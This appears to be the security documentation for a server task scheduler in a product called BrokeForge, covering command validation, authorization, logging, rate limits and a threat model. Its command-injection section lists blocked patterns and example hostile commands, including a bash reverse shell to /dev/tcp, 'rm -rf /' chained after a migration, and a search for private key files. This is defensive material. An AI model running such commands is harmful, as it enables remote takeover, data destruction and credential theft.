# Scheduler Security Documentation

## Enterprise-Grade Security Features

This document outlines the comprehensive security measures implemented in the BrokeForge Scheduler feature to ensure enterprise-grade protection against common attack vectors.

---

## 1. Command Injection Protection ✅ **CRITICAL**

### Implementation
**File**: `app/Rules/SafeCommand.php`

### Protection Against
- **Command injection via separators** (`;`, `&`, `|`, `` ` ``, `$()`, `${}`)
- **Reverse shells** (bash/python/perl with `/dev/tcp`)
- **System destruction** (`rm -rf /`, `mkfs`, `fdisk`, `dd`)
- **User manipulation** (userdel, passwd, chmod outside /home/brokeforge)
- **Network attacks** (nmap, netcat listeners)
- **Credential theft** (cat/grep on .ssh, .aws, shadow, passwd)
- **Download-and-execute** (curl/wget piped to bash)
- **Cron manipulation** (preventing cron within cron)
- **Service disruption** (systemctl stop critical services)
- **Null byte injection** (command injection technique)

### Allowed Operations
- Standard package management: `apt-get`, `npm install`, `composer update`
- Application commands: `php artisan`, `node`, `python scripts`
- File operations: within `/home/brokeforge` directory only
- Backups: tar, gzip, database dumps

### Validation Rules
- **Max command length**: 1000 characters
- **No sudo allowed**: Commands run with appropriate privileges automatically
- **Regex pattern matching**: 15+ dangerous patterns blocked
- **Character validation**: No null bytes or malicious substitution

### Example Blocked Commands
```bash
# Command injection
php artisan migrate && rm -rf /  # ❌ BLOCKED

# Reverse shell
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1  # ❌ BLOCKED

# Credential theft
find / -name "*.pem" 2>/dev/null  # ❌ BLOCKED

# Service manipulation
systemctl stop nginx  # ❌ BLOCKED
```

### Example Allowed Commands
```bash
# Safe application operations
php /home/brokeforge/artisan schedule:run  # ✅ ALLOWED
certbot renew --quiet  # ✅ ALLOWED
apt-get autoremove && apt-get autoclean  # ✅ ALLOWED
tar -czf /backups/db.tar.gz /var/lib/mysql  # ✅ ALLOWED
```

---

## 2. Authorization Policies ✅

### Implementation
**File**: `app/Policies/ServerSchedulerPolicy.php`

### Policy Methods
- `view(User, Server)` - View scheduler page
- `install(User, Server)` - Install scheduler framework
- `uninstall(User, Server)` - Uninstall scheduler framework
- `createTask(User, Server)` - Create scheduled tasks
- `updateTask(User, Server)` - Update scheduled tasks
- `deleteTask(User, Server)` - Delete scheduled tasks

### Authorization Checks
```php
// Controller enforces all policies
Gate::authorize('createTask', [ServerScheduler::class, $server]);
```

### Business Logic Validation
- Cannot install if already active/installing
- Cannot uninstall if not active
- Cannot create tasks if scheduler inactive
- Max 50 tasks per server (configurable)
- Server ownership validation ready for multi-tenancy

---

## 3. Comprehensive Audit Logging ✅

### Implementation
**Files**: All `ServerSchedulerController` methods

### Logged Events
All security-sensitive operations are logged with:
- User ID
- Server ID
- IP Address
- Timestamp
- Action details (command, task name, etc.)

### Log Levels
- **INFO**: Normal operations (task created, updated)
- **WARNING**: Destructive operations (task deleted, scheduler uninstalled)
- **ERROR**: Failures (logged automatically by Laravel)

### Example Log Entry
```json
{
    "level": "info",
    "message": "Scheduled task created",
    "context": {
        "user_id": 1,
        "server_id": 42,
        "task_id": 15,
        "task_name": "Daily Cleanup",
        "command": "apt-get autoremove && apt-get autoclean",
        "frequency": "daily",
        "ip_address": "192.168.1.100"
    },
    "timestamp": "2025-10-03T18:45:23.000000Z"
}
```

### Audit Trail Use Cases
- **Compliance**: SOC 2, HIPAA, PCI-DSS audits
- **Forensics**: Investigate security incidents
- **Accountability**: Track who did what and when
- **Alerting**: Detect suspicious patterns

---

## 4. Rate Limiting ✅

### Implementation
**File**: `routes/web.php`

### Rate Limits
| Endpoint | Limit | Purpose |
|----------|-------|---------|
| Scheduler pages | 60/min | General browsing |
| Install/Uninstall | 5/min | Prevent abuse |
| Task creation | 20/min | Prevent DoS |
| Task operations | 60/min | Normal usage |
| API heartbeat | 120/min | Task execution reports |

### Throttle Configuration
```php
Route::post('install', ...)
    ->middleware('throttle:5,1'); // 5 requests per minute
```

### Protection Against
- **DoS attacks**: Prevent server resource exhaustion
- **Brute force**: Slow down automated attacks
- **API abuse**: Limit excessive task creation
- **Resource exhaustion**: Prevent cron job flooding

---

## 5. Resource Limits ✅

### Maximum Tasks Per Server
**Config**: `config/scheduler.php`
```php
'max_tasks_per_server' => env('SCHEDULER_MAX_TASKS_PER_SERVER', 50)
```

### Task Timeout Limits
- **Default**: 300 seconds (5 minutes)
- **Maximum**: 3600 seconds (1 hour)
- **Enforced**: Wrapper script uses `timeout` command

### Protection Against
- **Resource exhaustion**: Prevent infinite loops
- **Server overload**: Limit concurrent cron jobs
- **Storage abuse**: Prevent log/database bloat

---

## 6. HTTPS Enforcement ✅

### Implementation
**File**: `resources/views/scheduler/task-wrapper.blade.php`

### Wrapper Script Validation
```bash
# Refuse to send data over HTTP
if [[ ! "${API_ENDPOINT}" =~ ^https:// ]]; then
    logger -t brokeforge-scheduler "SECURITY WARNING: Refusing insecure connection"
    exit 1
fi
```

### Protection Against
- **Man-in-the-middle attacks**: Encrypted data transmission
- **Token interception**: Scheduler tokens only sent over HTTPS
- **Data tampering**: SSL/TLS integrity protection

---

## 7. Token Security ✅

### Token Generation
**File**: `app/Models/Server.php`
```php
public function generateSchedulerToken(): string
{
    $token = bin2hex(random_bytes(32)); // 64-char hex string
    $this->update(['scheduler_token' => $token]);
    return $token;
}
```

### Token Storage
- **Database**: Encrypted using Laravel's encryption (`encrypted` cast)
- **Transmission**: Only over HTTPS
- **Validation**: Via `ValidateSchedulerToken` middleware

### Token Characteristics
- **Length**: 64 characters (256 bits of entropy)
- **Format**: Hexadecimal (cryptographically secure)
- **Rotation**: Manual (TODO: Implement automatic rotation)
- **Scope**: Per-server (isolated blast radius)

---

## 8. Input Sanitization ✅

### Form Request Validation
**Files**: `StoreScheduledTaskRequest.php`, `UpdateScheduledTaskRequest.php`

### Validation Rules
```php
[
    'name' => ['required', 'string', 'max:255'],
    'command' => ['required', 'string', 'max:1000', new SafeCommand],
    'frequency' => ['required', Rule::enum(ScheduleFrequency::class)],
    'cron_expression' => ['nullable', 'string', 'max:255', new ValidCronExpression],
    'timeout' => ['integer', 'min:1', 'max:3600'],
]
```

### Validation Features
- **Type enforcement**: Strict type checking via enums
- **Length limits**: Prevent buffer overflow/storage abuse
- **Custom rules**: SafeCommand, ValidCronExpression
- **Enum validation**: Only allow predefined frequencies

---

## 9. Scoped Route Model Binding ✅

### Implementation
**File**: `routes/web.php`
```php
Route::prefix('tasks')->scopeBindings()->group(function () {
    Route::put('{serverScheduledTask}', ...);
});
```

### Security Benefit
Laravel automatically validates:
- Task belongs to the server in the URL
- Prevents cross-server task manipulation
- Stops unauthorized access via ID manipulation

### Example Attack Prevented
```
# Attacker tries to modify task 100 on server 50
PUT /servers/50/scheduler/tasks/100

# Laravel checks: Does task 100 belong to server 50?
# If NO → 404 Not Found (before reaching controller)
```

---

## 10. Database Security ✅

### Performance Indexes
**Migration**: `2025_10_03_184032_add_additional_scheduler_indexes.php`

Indexes added for:
- Fast filtering by status
- Efficient exit code queries (security monitoring)
- Optimized time-range queries
- Composite indexes for multi-column searches

### Query Optimization
- **Eager loading**: Prevent N+1 queries
- **Selective columns**: Load only needed data
- **Pagination limits**: Max 50 recent runs
- **Retention policy**: Auto-cleanup after 90 days

---

## 11. Remote Server Security ✅

### Script Execution
- **Wrapper scripts**: Isolated per-task (`/opt/brokeforge/scheduler/tasks/{id}.sh`)
- **Cron entries**: Separate files (`/etc/cron.d/brokeforge-task-{id}`)
- **Log isolation**: Dedicated log file (`/var/log/brokeforge/scheduler.log`)

### Permission Model
- **Execution**: Root user (cron runs as root)
- **Script permissions**: 755 (executable by all, writable by root only)
- **Cron permissions**: 644 (readable by all, writable by root only)

### Cleanup on Removal
- Cron entries deleted
- Wrapper scripts deleted
- Verification of removal
- Database marked as deleted (after success)

---

## 12. Frontend Security ✅

### TypeScript Type Safety
Prevents runtime errors and XSS via strict typing:
```typescript
interface ServerScheduledTask {
    id: number;
    command: string;  // Always string, never executable code
    status: 'active' | 'paused' | 'failed'; // Enum-like safety
}
```

### React Best Practices
- No `dangerouslySetInnerHTML` usage
- Escaped output via React's JSX
- CSRF tokens on all forms (Laravel Inertia)
- Input validation on frontend + backend

---

## Security Checklist

- [x] Command injection protection
- [x] Authorization policies on all endpoints
- [x] Comprehensive audit logging
- [x] Rate limiting (web + API)
- [x] Resource limits (tasks, timeout)
- [x] HTTPS enforcement
- [x] Secure token generation
- [x] Input validation + sanitization
- [x] Scoped route model binding
- [x] Database indexes for security monitoring
- [x] Remote script isolation
- [x] Frontend type safety
- [ ] **TODO**: Token rotation mechanism
- [ ] **TODO**: Anomaly detection (excessive failures)
- [ ] **TODO**: Email alerts for security events
- [ ] **TODO**: IP whitelisting for API endpoints
- [ ] **TODO**: Multi-tenancy ownership validation

---

## Threat Model

### Mitigated Threats
| Threat | Mitigation | Severity |
|--------|-----------|----------|
| Command injection | SafeCommand rule | **CRITICAL** |
| Unauthorized access | Policies + scoped binding | **HIGH** |
| DoS/Resource exhaustion | Rate limits + max tasks | **HIGH** |
| Credential theft | Command pattern blocking | **HIGH** |
| MITM attacks | HTTPS enforcement | **MEDIUM** |
| Audit gaps | Comprehensive logging | **MEDIUM** |
| XSS | React escaping + validation | **MEDIUM** |

### Remaining Risks
- **Token rotation**: Tokens never expire (mitigation: monitor logs)
- **Insider threats**: Authorized users can run allowed commands
- **Zero-day exploits**: Unknown vulnerabilities in dependencies

---

## Compliance Considerations

### SOC 2 Type II
- ✅ Access controls (policies)
- ✅ Audit logging (all operations)
- ✅ Encryption in transit (HTTPS)
- ✅ Encryption at rest (database encryption)

### HIPAA
- ✅ Access controls
- ✅ Audit trails
- ✅ Encryption
- ⚠️ **Note**: BrokeForge is infrastructure management, not PHI storage

### PCI-DSS
- ✅ Access controls
- ✅ Encryption
- ✅ Logging and monitoring
- ⚠️ **Note**: Never store payment card data in scheduled tasks

---

## Security Incident Response

### Detection
1. Monitor logs for failed authorization attempts
2. Alert on high-frequency rate limit violations
3. Detect suspicious command patterns (even if allowed)
4. Track excessive task failures

### Response
1. **Immediate**: Disable scheduler for affected server
2. **Investigation**: Review audit logs for user/IP
3. **Containment**: Revoke tokens, reset passwords
4. **Recovery**: Remove malicious tasks, restore clean state
5. **Post-mortem**: Update SafeCommand rules if needed

---

## Security Best Practices for Users

### Command Guidelines
- **DO**: Use absolute paths (`/usr/bin/php`, not `php`)
- **DO**: Validate input in your scripts
- **DO**: Set reasonable timeouts
- **DON'T**: Download and execute untrusted code
- **DON'T**: Hardcode credentials in commands
- **DON'T**: Run commands as root unless necessary

### Token Management
- **DO**: Rotate tokens periodically (manual for now)
- **DO**: Keep tokens in encrypted storage
- **DON'T**: Share tokens between servers
- **DON'T**: Commit tokens to version control

---

## Changelog

**2025-10-03** - Initial security implementation
- Added SafeCommand validation rule
- Implemented authorization policies
- Added comprehensive audit logging
- Configured rate limiting
- Enforced HTTPS for API communication
- Added resource limits and indexes

---

## Contact

For security concerns or to report vulnerabilities:
- **Email**: security@brokeforge.app (if applicable)
- **GitHub Issues**: For non-sensitive security improvements
